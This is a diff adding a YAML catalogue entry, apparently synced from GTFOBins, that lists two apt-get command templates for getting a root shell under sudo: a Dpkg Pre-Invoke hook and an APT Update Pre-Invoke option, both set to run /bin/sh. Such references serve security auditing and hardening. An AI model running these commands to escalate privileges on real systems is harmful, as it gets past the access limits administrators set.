@@ -1,0 +1,29 @@
+id: gtfobins/apt-get/shell/sudo
+type: binary
+platform: linux
+name: apt-get
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''Dpkg::Pre-Invoke {"/bin/sh;false"}'' >/path/to/temp-file
+
+    apt-get -y install -c /path/to/temp-file sl'
+  comment: For this to work the target package (i.e., `sl`) must not be already installed.
+- template: apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+  comment: When the shell exits the `update` command is actually executed.
+references:
+- https://gtfobins.github.io/gtfobins/apt-get/
+tags:
+- linux
+- unix
+- gtfobins
